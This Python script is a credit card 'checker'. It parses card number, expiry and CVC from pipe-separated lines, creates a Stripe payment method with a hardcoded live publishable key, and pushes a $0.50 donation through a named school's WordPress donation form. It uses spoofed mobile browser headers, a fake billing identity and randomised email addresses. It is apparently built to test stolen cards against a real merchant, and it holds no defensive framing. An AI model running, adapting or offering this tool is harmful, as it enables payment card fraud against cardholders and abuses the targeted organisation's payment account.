import requests,re
import random

def Tele(ccx):
    ccx = ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    
    # Handle both 2 and 4 digit year formats
    yy = yy.strip()
    if len(yy) == 4 and yy.startswith("20"):  # 4-digit year like 2025
        yy = yy[2:]  # Convert to 2-digit (25)
    r = requests.session()

    random_amount1 = random.randint(1, 4)
    random_amount2 = random.randint(1, 99)

    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }

    data = f'type=card&billing_details[name]=Waiyan&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Ff4aa9d6f0f%3B+stripe-js-v3%2Ff4aa9d6f0f%3B+card-element&key=pk_live_51LTAH3KQqBJAM2n1ywv46dJsjQWht8ckfcm7d15RiE8eIpXWXUvfshCKKsDCyFZG48CY68L9dUTB0UsbDQe32Zn700Qe4vrX0d'
    
    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    try:
        pm = response.json()['id']
    except (KeyError, ValueError) as e:
        print(f"Error parsing Stripe response: {e}")
        return "API Error: Invalid response"

    headers = {
        'authority': 'texassouthernacademy.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://texassouthernacademy.com',
        'referer': 'https://texassouthernacademy.com/donation/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'action': 'wp_full_stripe_inline_donation_charge',
        'wpfs-form-name': 'donate',
        'wpfs-form-get-parameters': '%7B%7D',
        'wpfs-custom-amount': 'other',
        'wpfs-custom-amount-unique': '0.50',
        'wpfs-donation-frequency': 'one-time',
        'wpfs-billing-name': 'Waiyan',
        'wpfs-billing-address-country': 'US',
        'wpfs-billing-address-line-1': '7246 Royal Ln',
        'wpfs-billing-address-line-2': '',
        'wpfs-billing-address-city': 'Bellevue',
        'wpfs-billing-address-state': '',
        'wpfs-billing-address-state-select': 'NY',
        'wpfs-billing-address-zip': '10080',
        'wpfs-card-holder-email': f'Waiyan{random_amount1}{random_amount2}@gmail.com',
        'wpfs-card-holder-name': 'Waiyan',
        'wpfs-stripe-payment-method-id': f'{pm}',
    }

    response = requests.post('https://texassouthernacademy.com/wp-admin/admin-ajax.php', headers=headers, data=data)
    try:
        result = response.json()['message']
        return result
    except (KeyError, ValueError) as e:
        print(f"Error parsing response: {e}")
        return "API Error: Invalid response"
